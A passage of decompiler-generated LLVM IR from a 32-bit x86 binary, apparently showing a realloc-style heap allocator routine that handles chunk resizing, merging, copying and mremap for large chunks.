  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v0_8053dbc = load i32, i32* @ebp, align 4
  %v0_8053dbd = load i32, i32* @edi, align 4
  %v0_8053dbe = load i32, i32* @esi, align 4
  %v0_8053dbf = load i32, i32* @ebx, align 4
  store i32 %tmp7, i32* @ebx, align 4
  %v4_8053dc7 = icmp eq i32 %tmp6, 0
  %v1_8053dcc = icmp eq i1 %v4_8053dc7, false
  br i1 %v1_8053dcc, label %dec_label_pc_8053dde, label %dec_label_pc_8053dce

dec_label_pc_8053dce:                             ; preds = %dec_label_pc_8053dbc
  store i32 %tmp7, i32* %stack_var_-60, align 4
  %v1_8053dd2 = call i32 @function_8053554(i32 %tmp7)
  store i32 %v1_8053dd2, i32* %eax.global-to-local, align 4
  store i32 %v1_8053dd2, i32* @ebx, align 4
  br label %dec_label_pc_80540d7

dec_label_pc_8053dde:                             ; preds = %dec_label_pc_8053dbc
  %v1_8053dde = icmp eq i32 %tmp7, 0
  %v1_8053de0 = icmp eq i1 %v1_8053dde, false
  br i1 %v1_8053de0, label %dec_label_pc_8053df3, label %dec_label_pc_8053de2

dec_label_pc_8053de2:                             ; preds = %dec_label_pc_8053dde
  store i32 %tmp6, i32* %stack_var_-60, align 4
  %v1_8053de9 = call i32 @function_8054319(i32 %tmp6)
  store i32 %v1_8053de9, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80540d7

dec_label_pc_8053df3:                             ; preds = %dec_label_pc_8053dde
  %v2_8053dfe = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8053dfe, i32* @eax, align 4
  store i32 %v2_8053dfe, i32* %stack_var_-60, align 4
  %v2_8053e03 = call i32 @function_8054a80(i32 %v2_8053dfe, i32 134564477)
  store i32 %v2_8053e03, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_80571e0.205 to i32), i32* %stack_var_-60, align 4
  %v1_8053e0f = call i32 @function_8054a7d(i32 ptrtoint (i32* @global_var_80571e0.205 to i32))
  store i32 %v1_8053e0f, i32* %eax.global-to-local, align 4
  %v0_8053e17 = load i32, i32* @ebx, align 4
  %tmp19 = icmp ult i32 %v0_8053e17, -32
  br i1 %tmp19, label %dec_label_pc_8053e2e, label %dec_label_pc_8053e1c

dec_label_pc_8053e1c:                             ; preds = %dec_label_pc_8053df3
  %v0_8053e1c = load i32, i32* %stack_var_-60, align 4
  %v1_8053e1c = call i32 @function_80530f9(i32 %v0_8053e1c)
  store i32 %v1_8053e1c, i32* %eax.global-to-local, align 4
  store i32 0, i32* @ebx, align 4
  %v1_8053e23 = inttoptr i32 %v1_8053e1c to i32*
  store i32 12, i32* %v1_8053e23, align 4
  br label %dec_label_pc_80540da

dec_label_pc_8053e2e:                             ; preds = %dec_label_pc_8053df3
  %v1_8053e2e = add i32 %v0_8053e17, 11
  %tmp20 = icmp ult i32 %v1_8053e2e, 16
  br i1 %tmp20, label %dec_label_pc_8053e45, label %dec_label_pc_8053e3e

dec_label_pc_8053e3e:                             ; preds = %dec_label_pc_8053e2e
  %v1_8053e3e = and i32 %v1_8053e2e, -8
  br label %dec_label_pc_8053e45

dec_label_pc_8053e45:                             ; preds = %dec_label_pc_8053e2e, %dec_label_pc_8053e3e
  %stack_var_-40.0 = phi i32 [ %v1_8053e3e, %dec_label_pc_8053e3e ], [ 16, %dec_label_pc_8053e2e ]
  %storemerge26 = phi i32 [ %v1_8053e3e, %dec_label_pc_8053e3e ], [ %v1_8053e2e, %dec_label_pc_8053e2e ]
  store i32 %storemerge26, i32* %eax.global-to-local, align 4
  %v1_8053e49 = add i32 %tmp6, -8
  store i32 %v1_8053e49, i32* @edi, align 4
  %v1_8053e4c = add i32 %tmp6, -4
  %v2_8053e4c = inttoptr i32 %v1_8053e4c to i32*
  %v3_8053e4c = load i32, i32* %v2_8053e4c, align 4
  store i32 %v3_8053e4c, i32* @edx, align 4
  %v1_8053e51 = and i32 %v3_8053e4c, -4
  store i32 %v1_8053e51, i32* %eax.global-to-local, align 4
  %v2_8053e58 = and i32 %v3_8053e4c, 2
  %v3_8053e58 = icmp eq i32 %v2_8053e58, 0
  %v1_8053e5b = icmp eq i1 %v3_8053e58, false
  br i1 %v1_8053e5b, label %dec_label_pc_8053ff5, label %dec_label_pc_8053e61

dec_label_pc_8053e61:                             ; preds = %dec_label_pc_8053e45
  store i32 %stack_var_-40.0, i32* %ecx.global-to-local, align 4
  store i32 %v1_8053e51, i32* @ebx, align 4
  %v7_8053e67 = icmp ult i32 %v1_8053e51, %stack_var_-40.0
  %v1_8053e69 = icmp eq i1 %v7_8053e67, false
  br i1 %v1_8053e69, label %dec_label_pc_8053fa0, label %dec_label_pc_8053e6f

dec_label_pc_8053e6f:                             ; preds = %dec_label_pc_8053e61
  %v2_8053e6f = add i32 %v1_8053e51, %v1_8053e49
  store i32 %v2_8053e6f, i32* @esi, align 4
  %v1_8053e72 = load i32, i32* @global_var_80575ac.207, align 4
  %v12_8053e72 = icmp eq i32 %v2_8053e6f, %v1_8053e72
  %v1_8053e78 = icmp eq i1 %v12_8053e72, false
  %v1_8053eb2 = add i32 %v2_8053e6f, 4
  %v2_8053eb2 = inttoptr i32 %v1_8053eb2 to i32*
  %v3_8053eb2 = load i32, i32* %v2_8053eb2, align 4
  br i1 %v1_8053e78, label %dec_label_pc_8053eb2, label %dec_label_pc_8053e7a

dec_label_pc_8053e7a:                             ; preds = %dec_label_pc_8053e6f
  %v1_8053e7f = and i32 %v3_8053eb2, -4
  %v2_8053e82 = add i32 %v1_8053e7f, %v1_8053e51
  store i32 %v2_8053e82, i32* %ecx.global-to-local, align 4
  %v1_8053e88 = add i32 %stack_var_-40.0, 16
  store i32 %v1_8053e88, i32* %eax.global-to-local, align 4
  %v7_8053e8b = icmp ult i32 %v2_8053e82, %v1_8053e88
  br i1 %v7_8053e8b, label %dec_label_pc_8053ef0, label %dec_label_pc_8053e8f

dec_label_pc_8053e8f:                             ; preds = %dec_label_pc_8053e7a
  %v1_8053e8f = urem i32 %v3_8053e4c, 2
  %v5_8053e92 = or i32 %v1_8053e8f, %stack_var_-40.0
  store i32 %v5_8053e92, i32* @edx, align 4
  store i32 %v5_8053e92, i32* %v2_8053e4c, align 4
  %v0_8053e9d = load i32, i32* %ecx.global-to-local, align 4
  %v2_8053e9d = sub i32 %v0_8053e9d, %stack_var_-40.0
  %v0_8053e9f = load i32, i32* @edi, align 4
  %v2_8053e9f = add i32 %v0_8053e9f, %stack_var_-40.0
  store i32 %v2_8053e9f, i32* %eax.global-to-local, align 4
  %v1_8053ea2 = or i32 %v2_8053e9d, 1
  store i32 %v1_8053ea2, i32* %ecx.global-to-local, align 4
  store i32 %v2_8053e9f, i32* @global_var_80575ac.207, align 4
  %v2_8053eaa = add i32 %v2_8053e9f, 4
  %v3_8053eaa = inttoptr i32 %v2_8053eaa to i32*
  store i32 %v1_8053ea2, i32* %v3_8053eaa, align 4
  br label %dec_label_pc_80540c5

dec_label_pc_8053eb2:                             ; preds = %dec_label_pc_8053e6f
  %v1_8053eb7 = and i32 %v3_8053eb2, -2
  store i32 %v1_8053eb7, i32* %eax.global-to-local, align 4
  %v3_8053eba = add i32 %v1_8053eb2, %v1_8053eb7
  %v4_8053eba = inttoptr i32 %v3_8053eba to i8*
  %v5_8053eba = load i8, i8* %v4_8053eba, align 1
  %v6_8053eba = urem i8 %v5_8053eba, 2
  %v7_8053eba = icmp eq i8 %v6_8053eba, 0
  %v1_8053ebf = icmp eq i1 %v7_8053eba, false
  br i1 %v1_8053ebf, label %dec_label_pc_8053ef0, label %dec_label_pc_8053ec1

dec_label_pc_8053ec1:                             ; preds = %dec_label_pc_8053eb2
  %v1_8053ec1 = and i32 %v3_8053eb2, -4
  %v2_8053ec8 = add i32 %v1_8053ec1, %v1_8053e51
  store i32 %v2_8053ec8, i32* @ebx, align 4
  %v10_8053eca = icmp ult i32 %v2_8053ec8, %stack_var_-40.0
  br i1 %v10_8053eca, label %dec_label_pc_8053ef0, label %dec_label_pc_8053ed0

dec_label_pc_8053ed0:                             ; preds = %dec_label_pc_8053ec1
  %v1_8053ed0 = add i32 %v1_8053e51, %tmp6
  %v2_8053ed0 = inttoptr i32 %v1_8053ed0 to i32*
  %v3_8053ed0 = load i32, i32* %v2_8053ed0, align 4
  store i32 %v3_8053ed0, i32* @edx, align 4
  %v1_8053ed3 = add i32 %v2_8053e6f, 12
  %v2_8053ed3 = inttoptr i32 %v1_8053ed3 to i32*
  %v3_8053ed3 = load i32, i32* %v2_8053ed3, align 4
  store i32 %v3_8053ed3, i32* %eax.global-to-local, align 4
  %v1_8053ed6 = add i32 %v3_8053ed0, 12
  %v2_8053ed6 = inttoptr i32 %v1_8053ed6 to i32*
  %v3_8053ed6 = load i32, i32* %v2_8053ed6, align 4
  %v15_8053ed6 = icmp eq i32 %v3_8053ed6, %v2_8053e6f
  %v1_8053ed9 = icmp eq i1 %v15_8053ed6, false
  br i1 %v1_8053ed9, label %dec_label_pc_8053ee0, label %dec_label_pc_8053edb

dec_label_pc_8053edb:                             ; preds = %dec_label_pc_8053ed0
  %v1_8053edb = add i32 %v3_8053ed3, 8
  %v2_8053edb = inttoptr i32 %v1_8053edb to i32*
  %v3_8053edb = load i32, i32* %v2_8053edb, align 4
  %v15_8053edb = icmp eq i32 %v3_8053edb, %v2_8053e6f
  br i1 %v15_8053edb, label %dec_label_pc_8053ee5, label %dec_label_pc_8053ee0

dec_label_pc_8053ee0:                             ; preds = %dec_label_pc_8053edb, %dec_label_pc_8053ed0
  %v0_8053ee0 = call i32 @function_80544b5()
  store i32 %v0_8053ee0, i32* %eax.global-to-local, align 4
  %v1_8053ee5.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8053ee5

dec_label_pc_8053ee5:                             ; preds = %dec_label_pc_8053edb, %dec_label_pc_8053ee0
  %v1_8053ee5 = phi i32 [ %v3_8053ed0, %dec_label_pc_8053edb ], [ %v1_8053ee5.pre, %dec_label_pc_8053ee0 ]
  %v0_8053ee5 = phi i32 [ %v3_8053ed3, %dec_label_pc_8053edb ], [ %v0_8053ee0, %dec_label_pc_8053ee0 ]
  %v2_8053ee5 = add i32 %v1_8053ee5, 12
  %v3_8053ee5 = inttoptr i32 %v2_8053ee5 to i32*
  store i32 %v0_8053ee5, i32* %v3_8053ee5, align 4
  %v0_8053ee8 = load i32, i32* @edx, align 4
  %v1_8053ee8 = load i32, i32* %eax.global-to-local, align 4
  %v2_8053ee8 = add i32 %v1_8053ee8, 8
  %v3_8053ee8 = inttoptr i32 %v2_8053ee8 to i32*
  store i32 %v0_8053ee8, i32* %v3_8053ee8, align 4
  %v0_8053fa0.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8053fa0

dec_label_pc_8053ef0:                             ; preds = %dec_label_pc_8053ec1, %dec_label_pc_8053eb2, %dec_label_pc_8053e7a
  %v1_8053ef7 = add i32 %stack_var_-40.0, -7
  store i32 %v1_8053ef7, i32* %eax.global-to-local, align 4
  store i32 %v1_8053ef7, i32* %stack_var_-60, align 4
  %v1_8053efb = call i32 @function_8053554(i32 %v1_8053ef7)
  store i32 %v1_8053efb, i32* %eax.global-to-local, align 4
  store i32 %v1_8053efb, i32* @edx, align 4
  %v1_8053f05 = icmp eq i32 %v1_8053efb, 0
  br i1 %v1_8053f05, label %dec_label_pc_80540c1, label %dec_label_pc_8053f0d

dec_label_pc_8053f0d:                             ; preds = %dec_label_pc_8053ef0
  %v1_8053f0d = add i32 %v1_8053efb, -8
  store i32 %v1_8053f0d, i32* %ebx.global-to-local, align 4
  %v1_8053f10 = load i32, i32* @esi, align 4
  %v12_8053f10 = icmp eq i32 %v1_8053f0d, %v1_8053f10
  %v1_8053f12 = add i32 %v1_8053efb, -4
  %v2_8053f12 = inttoptr i32 %v1_8053f12 to i32*
  %v3_8053f12 = load i32, i32* %v2_8053f12, align 4
  store i32 %v3_8053f12, i32* %eax.global-to-local, align 4
  %v1_8053f15 = icmp eq i1 %v12_8053f10, false
  br i1 %v1_8053f15, label %dec_label_pc_8053f23, label %dec_label_pc_8053f17

dec_label_pc_8053f17:                             ; preds = %dec_label_pc_8053f0d
  %v1_8053f17 = and i32 %v3_8053f12, -4
  store i32 %v1_8053f17, i32* %eax.global-to-local, align 4
  store i32 %v1_8053e51, i32* @edx, align 4
  %v2_8053f1e = add i32 %v1_8053f17, %v1_8053e51
  store i32 %v2_8053f1e, i32* @ebx, align 4
  br label %dec_label_pc_8053fa0

dec_label_pc_8053f23:                             ; preds = %dec_label_pc_8053f0d
  %v1_8053f27 = add i32 %v1_8053e51, -4
  store i32 %v1_8053f27, i32* %eax.global-to-local, align 4
  %v2_8053f2c = udiv i32 %v1_8053f27, 4
  store i32 %v2_8053f2c, i32* %ecx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8053f27, 37
  br i1 %tmp, label %dec_label_pc_8053f45, label %dec_label_pc_8053f34

dec_label_pc_8053f34:                             ; preds = %dec_label_pc_8053f23
  store i32 %v1_8053efb, i32* %stack_var_-60, align 4
  %v3_8053f3b = inttoptr i32 %v1_8053efb to i16*
  %v4_8053f3b = call i32 @function_8055342(i16* %v3_8053f3b, i32 %tmp6, i32 %v1_8053f27)
  store i32 %v4_8053f3b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053f8c

dec_label_pc_8053f45:                             ; preds = %dec_label_pc_8053f23
  store i32 %tmp6, i32* @esi, align 4
  %v1_8053f4c = inttoptr i32 %tmp6 to i32*
  %v2_8053f4c = load i32, i32* %v1_8053f4c, align 4
  store i32 %v2_8053f4c, i32* %eax.global-to-local, align 4
  %v2_8053f4e = inttoptr i32 %v1_8053efb to i32*
  store i32 %v2_8053f4c, i32* %v2_8053f4e, align 4
  %v0_8053f50 = load i32, i32* @esi, align 4
  %v1_8053f50 = add i32 %v0_8053f50, 4
  %v2_8053f50 = inttoptr i32 %v1_8053f50 to i32*
  %v3_8053f50 = load i32, i32* %v2_8053f50, align 4
  store i32 %v3_8053f50, i32* %eax.global-to-local, align 4
  %v1_8053f53 = load i32, i32* @edx, align 4
  %v2_8053f53 = add i32 %v1_8053f53, 4
  %v3_8053f53 = inttoptr i32 %v2_8053f53 to i32*
  store i32 %v3_8053f50, i32* %v3_8053f53, align 4
  %v0_8053f56 = load i32, i32* @esi, align 4
  %v1_8053f56 = add i32 %v0_8053f56, 8
  %v2_8053f56 = inttoptr i32 %v1_8053f56 to i32*
  %v3_8053f56 = load i32, i32* %v2_8053f56, align 4
  store i32 %v3_8053f56, i32* %eax.global-to-local, align 4
  %v1_8053f59 = load i32, i32* @edx, align 4
  %v2_8053f59 = add i32 %v1_8053f59, 8
  %v3_8053f59 = inttoptr i32 %v2_8053f59 to i32*
  store i32 %v3_8053f56, i32* %v3_8053f59, align 4
  %tmp27 = icmp ult i32 %v1_8053f27, 17
  br i1 %tmp27, label %dec_label_pc_8053f8c, label %dec_label_pc_8053f5e

dec_label_pc_8053f5e:                             ; preds = %dec_label_pc_8053f45
  %v0_8053f5e = load i32, i32* @esi, align 4
  %v1_8053f5e = add i32 %v0_8053f5e, 12
  %v2_8053f5e = inttoptr i32 %v1_8053f5e to i32*
  %v3_8053f5e = load i32, i32* %v2_8053f5e, align 4
  store i32 %v3_8053f5e, i32* %eax.global-to-local, align 4
  %v0_8053f61 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8053f64 = load i32, i32* @edx, align 4
  %v2_8053f64 = add i32 %v1_8053f64, 12
  %v3_8053f64 = inttoptr i32 %v2_8053f64 to i32*
  store i32 %v3_8053f5e, i32* %v3_8053f64, align 4
  %v0_8053f67 = load i32, i32* @esi, align 4
  %v1_8053f67 = add i32 %v0_8053f67, 16
  %v2_8053f67 = inttoptr i32 %v1_8053f67 to i32*
  %v3_8053f67 = load i32, i32* %v2_8053f67, align 4
  store i32 %v3_8053f67, i32* %eax.global-to-local, align 4
  %v1_8053f6a = load i32, i32* @edx, align 4
  %v2_8053f6a = add i32 %v1_8053f6a, 16
  %v3_8053f6a = inttoptr i32 %v2_8053f6a to i32*
  store i32 %v3_8053f67, i32* %v3_8053f6a, align 4
  %tmp21 = icmp ult i32 %v0_8053f61, 7
  br i1 %tmp21, label %dec_label_pc_8053f8c, label %dec_label_pc_8053f6f

dec_label_pc_8053f6f:                             ; preds = %dec_label_pc_8053f5e
  %v0_8053f6f = load i32, i32* @esi, align 4
  %v1_8053f6f = add i32 %v0_8053f6f, 20
  %v2_8053f6f = inttoptr i32 %v1_8053f6f to i32*
  %v3_8053f6f = load i32, i32* %v2_8053f6f, align 4
  store i32 %v3_8053f6f, i32* %eax.global-to-local, align 4
  %v0_8053f72 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8053f75 = load i32, i32* @edx, align 4
  %v2_8053f75 = add i32 %v1_8053f75, 20
  %v3_8053f75 = inttoptr i32 %v2_8053f75 to i32*
  store i32 %v3_8053f6f, i32* %v3_8053f75, align 4
  %v0_8053f78 = load i32, i32* @esi, align 4
  %v1_8053f78 = add i32 %v0_8053f78, 24
  %v2_8053f78 = inttoptr i32 %v1_8053f78 to i32*
  %v3_8053f78 = load i32, i32* %v2_8053f78, align 4
  store i32 %v3_8053f78, i32* %eax.global-to-local, align 4
  %v1_8053f7b = load i32, i32* @edx, align 4
  %v2_8053f7b = add i32 %v1_8053f7b, 24
  %v3_8053f7b = inttoptr i32 %v2_8053f7b to i32*
  store i32 %v3_8053f78, i32* %v3_8053f7b, align 4
  %tmp22 = icmp ult i32 %v0_8053f72, 9
  br i1 %tmp22, label %dec_label_pc_8053f8c, label %dec_label_pc_8053f80

dec_label_pc_8053f80:                             ; preds = %dec_label_pc_8053f6f
  %v0_8053f80 = load i32, i32* @esi, align 4
  %v1_8053f80 = add i32 %v0_8053f80, 28
  %v2_8053f80 = inttoptr i32 %v1_8053f80 to i32*
  %v3_8053f80 = load i32, i32* %v2_8053f80, align 4
  store i32 %v3_8053f80, i32* %eax.global-to-local, align 4
  %v1_8053f83 = load i32, i32* @edx, align 4
  %v2_8053f83 = add i32 %v1_8053f83, 28
  %v3_8053f83 = inttoptr i32 %v2_8053f83 to i32*
  store i32 %v3_8053f80, i32* %v3_8053f83, align 4
  %v0_8053f86 = load i32, i32* @esi, align 4
  %v1_8053f86 = add i32 %v0_8053f86, 32
  %v2_8053f86 = inttoptr i32 %v1_8053f86 to i32*
  %v3_8053f86 = load i32, i32* %v2_8053f86, align 4
  store i32 %v3_8053f86, i32* %eax.global-to-local, align 4
  %v1_8053f89 = load i32, i32* @edx, align 4
  %v2_8053f89 = add i32 %v1_8053f89, 32
  %v3_8053f89 = inttoptr i32 %v2_8053f89 to i32*
  store i32 %v3_8053f86, i32* %v3_8053f89, align 4
  br label %dec_label_pc_8053f8c

dec_label_pc_8053f8c:                             ; preds = %dec_label_pc_8053f6f, %dec_label_pc_8053f5e, %dec_label_pc_8053f45, %dec_label_pc_8053f34, %dec_label_pc_8053f80
  %v0_8053f8f = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053f8f = add i32 %v0_8053f8f, 8
  store i32 %v1_8053f8f, i32* @ebx, align 4
  store i32 %tmp6, i32* %stack_var_-60, align 4
  %v1_8053f96 = call i32 @function_8054319(i32 %tmp6)
  br label %dec_label_pc_80540bc

dec_label_pc_8053fa0:                             ; preds = %dec_label_pc_8053e61, %dec_label_pc_8053f17, %dec_label_pc_8053ee5
  %v1_8053fb1 = phi i32 [ %v1_8053e51, %dec_label_pc_8053e61 ], [ %v2_8053f1e, %dec_label_pc_8053f17 ], [ %v0_8053fa0.pre, %dec_label_pc_8053ee5 ]
  %v5_8053fa2 = sub i32 %v1_8053fb1, %stack_var_-40.0
  store i32 %v5_8053fa2, i32* %ecx.global-to-local, align 4
  %tmp23 = icmp ult i32 %v5_8053fa2, 16
  br i1 %tmp23, label %dec_label_pc_8053fab, label %dec_label_pc_8053fbd

dec_label_pc_8053fab:                             ; preds = %dec_label_pc_8053fa0
  %v0_8053fab = load i32, i32* @edi, align 4
  %v1_8053fab = add i32 %v0_8053fab, 4
  %v2_8053fab = inttoptr i32 %v1_8053fab to i32*
  %v3_8053fab = load i32, i32* %v2_8053fab, align 4
  %v1_8053fae = urem i32 %v3_8053fab, 2
  %v2_8053fb1 = or i32 %v1_8053fae, %v1_8053fb1
  store i32 %v2_8053fb1, i32* %eax.global-to-local, align 4
  store i32 %v2_8053fb1, i32* %v2_8053fab, align 4
  %v0_8053fb6 = load i32, i32* @edi, align 4
  %v1_8053fb6 = load i32, i32* @ebx, align 4
  %v2_8053fb6 = add i32 %v0_8053fb6, 4
  %v3_8053fb6 = add i32 %v2_8053fb6, %v1_8053fb6
  %v4_8053fb6 = inttoptr i32 %v3_8053fb6 to i32*
  %v5_8053fb6 = load i32, i32* %v4_8053fb6, align 4
  %v6_8053fb6 = or i32 %v5_8053fb6, 1
  store i32 %v6_8053fb6, i32* %v4_8053fb6, align 4
  br label %dec_label_pc_8053fed

dec_label_pc_8053fbd:                             ; preds = %dec_label_pc_8053fa0
  %v0_8053fc1 = load i32, i32* @edi, align 4
  %v2_8053fc1 = add i32 %v0_8053fc1, %stack_var_-40.0
  store i32 %v2_8053fc1, i32* %eax.global-to-local, align 4
  %v1_8053fc4 = add i32 %v0_8053fc1, 4
  %v2_8053fc4 = inttoptr i32 %v1_8053fc4 to i32*
  %v3_8053fc4 = load i32, i32* %v2_8053fc4, align 4
  %v1_8053fc7 = urem i32 %v3_8053fc4, 2
  %v5_8053fca = or i32 %v1_8053fc7, %stack_var_-40.0
  store i32 %v5_8053fca, i32* %v2_8053fc4, align 4
  %v0_8053fd4 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8053fd6 = or i32 %v0_8053fd4, 1
  store i32 %v1_8053fd6, i32* @edx, align 4
  %v1_8053fd9 = load i32, i32* %eax.global-to-local, align 4
  %v2_8053fd9 = add i32 %v1_8053fd9, 4
  %v3_8053fd9 = inttoptr i32 %v2_8053fd9 to i32*
  store i32 %v1_8053fd6, i32* %v3_8053fd9, align 4
  %v0_8053fdc = load i32, i32* %eax.global-to-local, align 4
  %v1_8053fdc = load i32, i32* %ecx.global-to-local, align 4
  %v2_8053fdc = add i32 %v0_8053fdc, 4
  %v3_8053fdc = add i32 %v2_8053fdc, %v1_8053fdc
  %v4_8053fdc = inttoptr i32 %v3_8053fdc to i32*
  %v5_8053fdc = load i32, i32* %v4_8053fdc, align 4
  %v6_8053fdc = or i32 %v5_8053fdc, 1
  store i32 %v6_8053fdc, i32* %v4_8053fdc, align 4
  %v0_8053fe1 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053fe1 = add i32 %v0_8053fe1, 8
  store i32 %v1_8053fe1, i32* %eax.global-to-local, align 4
  store i32 %v1_8053fe1, i32* %stack_var_-60, align 4
  %v1_8053fe5 = call i32 @function_8054319(i32 %v1_8053fe1)
  store i32 %v1_8053fe5, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053fed

dec_label_pc_8053fed:                             ; preds = %dec_label_pc_8053fab, %dec_label_pc_8053fbd
  %v0_8053fed = load i32, i32* @edi, align 4
  %v1_8053fed = add i32 %v0_8053fed, 8
  store i32 %v1_8053fed, i32* @ebx, align 4
  br label %dec_label_pc_80540c9

dec_label_pc_8053ff5:                             ; preds = %dec_label_pc_8053e45
  store i32 %tmp6, i32* %ecx.global-to-local, align 4
  %v0_8053ff9 = load i32, i32* @global_var_80578dc.212, align 4
  %v1_8053ffe = add i32 %v0_8053ff9, -1
  store i32 %v1_8053ffe, i32* %eax.global-to-local, align 4
  %v2_8054003 = inttoptr i32 %v1_8053e49 to i32*
  %v3_8054003 = load i32, i32* %v2_8054003, align 4
  store i32 %v3_8054003, i32* @ebp, align 4
  %v1_8054006 = or i32 %stack_var_-40.0, 4
  store i32 %v1_8054006, i32* %stack_var_-44, align 4
  %v2_805400c = add i32 %v3_8054003, %v1_8053ffe
  store i32 %v2_805400c, i32* @edx, align 4
  %v1_805400f = sub i32 0, %v0_8053ff9
  store i32 %v1_805400f, i32* %eax.global-to-local, align 4
  %v2_8054011 = add i32 %v2_805400c, %v1_8054006
  %v2_8054014 = and i32 %v2_8054011, %v1_805400f
  store i32 %v2_8054014, i32* @esi, align 4
  %v2_8054018 = sub i32 %v2_8054014, %v3_8054003
  store i32 %v2_8054018, i32* @ebx, align 4
  %v15_805401a = icmp eq i32 %v1_8053e51, %v2_8054018
  br i1 %v15_805401a, label %dec_label_pc_80540c5, label %dec_label_pc_8054024

dec_label_pc_8054024:                             ; preds = %dec_label_pc_8053ff5
  %v2_805402b = sub i32 %v1_8053e49, %v3_8054003
  store i32 %v2_805402b, i32* @edi, align 4
  %v2_805402d = add i32 %v3_8054003, %v1_8053e51
  store i32 %v2_805402d, i32* %eax.global-to-local, align 4
  store i32 %v2_805402b, i32* %stack_var_-60, align 4
  %v6_8054031 = inttoptr i32 %v2_805402b to i32*
  %v7_8054031 = call i32 @function_80551a6(i32* %v6_8054031, i32 %v2_805402d, i32 %v2_8054014, i32 1, i32 %v1_8054006, i32 %v1_8053e51)
  store i32 %v7_8054031, i32* %eax.global-to-local, align 4
  %v10_8054039 = icmp eq i32 %v7_8054031, -1
  br i1 %v10_8054039, label %dec_label_pc_805407d, label %dec_label_pc_805403e

dec_label_pc_805403e:                             ; preds = %dec_label_pc_8054024
  %v1_805403e = load i32, i32* @ebp, align 4
  %v2_805403e = add i32 %v1_805403e, %v7_8054031
  store i32 %v2_805403e, i32* @edx, align 4
  %v0_8054041 = load i32, i32* @ebx, align 4
  %v1_8054041 = or i32 %v0_8054041, 2
  store i32 %v1_8054041, i32* %ebx.global-to-local, align 4
  %v0_8054044 = load i32, i32* @esi, align 4
  store i32 %v0_8054044, i32* %eax.global-to-local, align 4
  %v2_8054046 = add i32 %v2_805403e, 4
  %v3_8054046 = inttoptr i32 %v2_8054046 to i32*
  store i32 %v1_8054041, i32* %v3_8054046, align 4
  %v0_8054049 = load i32, i32* %eax.global-to-local, align 4
  %v5_8054049 = sub i32 %v0_8054049, %v1_8053e51
  %v1_805404d = load i32, i32* @global_var_80578e4.217, align 4
  %v2_805404d = add i32 %v1_805404d, %v5_8054049
  store i32 %v2_805404d, i32* %eax.global-to-local, align 4
  store i32 %v2_805404d, i32* @global_var_80578e4.217, align 4
  %v1_8054058 = load i32, i32* @global_var_80578f0.218, align 16
  %tmp24 = icmp ugt i32 %v2_805404d, %v1_8054058
  br i1 %tmp24, label %dec_label_pc_8054060, label %dec_label_pc_8054065

dec_label_pc_8054060:                             ; preds = %dec_label_pc_805403e
  store i32 %v2_805404d, i32* @global_var_80578f0.218, align 16
  br label %dec_label_pc_8054065

dec_label_pc_8054065:                             ; preds = %dec_label_pc_805403e, %dec_label_pc_8054060
  %v1_8054065 = load i32, i32* @global_var_80578e8.219, align 8
  %v2_8054065 = add i32 %v1_8054065, %v2_805404d
  store i32 %v2_8054065, i32* %eax.global-to-local, align 4
  %v1_805406b = load i32, i32* @global_var_80578f4.220, align 4
  %tmp25 = icmp ugt i32 %v2_8054065, %v1_805406b
  br i1 %tmp25, label %dec_label_pc_8054073, label %dec_label_pc_8054078

dec_label_pc_8054073:                             ; preds = %dec_label_pc_8054065
  store i32 %v2_8054065, i32* @global_var_80578f4.220, align 4
  br label %dec_label_pc_8054078

dec_label_pc_8054078:                             ; preds = %dec_label_pc_8054065, %dec_label_pc_8054073
  %v0_8054078 = load i32, i32* @edx, align 4
  %v1_8054078 = add i32 %v0_8054078, 8
  store i32 %v1_8054078, i32* @ebx, align 4
  br label %dec_label_pc_80540c9

dec_label_pc_805407d:                             ; preds = %dec_label_pc_8054024
  %v2_805407d = load i32, i32* %stack_var_-44, align 4
  store i32 %v2_805407d, i32* %eax.global-to-local, align 4
  %v10_8054080 = icmp ult i32 %v1_8053e51, %v2_805407d
  %v1_8054084 = icmp eq i1 %v10_8054080, false
  br i1 %v1_8054084, label %dec_label_pc_80540c5, label %dec_label_pc_8054086

dec_label_pc_8054086:                             ; preds = %dec_label_pc_805407d
  %v1_805408d = add i32 %stack_var_-40.0, -7
  store i32 %v1_805408d, i32* %eax.global-to-local, align 4
  store i32 %v1_805408d, i32* %stack_var_-60, align 4
  %v1_8054091 = call i32 @function_8053554(i32 %v1_805408d)
  store i32 %v1_8054091, i32* %eax.global-to-local, align 4
  store i32 %v1_8054091, i32* @ebx, align 4
  %v1_805409b = icmp eq i32 %v1_8054091, 0
  br i1 %v1_805409b, label %dec_label_pc_80540c1, label %dec_label_pc_805409f

dec_label_pc_805409f:                             ; preds = %dec_label_pc_8054086
  %v1_80540a4 = add i32 %v1_8053e51, -8
  store i32 %v1_80540a4, i32* %eax.global-to-local, align 4
  store i32 %v1_8054091, i32* %stack_var_-60, align 4
  %v3_80540ad = inttoptr i32 %v1_8054091 to i16*
  %v4_80540ad = call i32 @function_8055342(i16* %v3_80540ad, i32 %tmp6, i32 %v1_80540a4)
  store i32 %v4_80540ad, i32* %eax.global-to-local, align 4
  store i32 %v1_8054091, i32* @edx, align 4
  store i32 %tmp6, i32* %stack_var_-60, align 4
  %v1_80540b7 = call i32 @function_8054319(i32 %tmp6)
  br label %dec_label_pc_80540bc

dec_label_pc_80540bc:                             ; preds = %dec_label_pc_8053f8c, %dec_label_pc_805409f
  %storemerge = phi i32 [ %v1_80540b7, %dec_label_pc_805409f ], [ %v1_8053f96, %dec_label_pc_8053f8c ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80540c9

dec_label_pc_80540c1:                             ; preds = %dec_label_pc_8054086, %dec_label_pc_8053ef0
  store i32 0, i32* @ebx, align 4
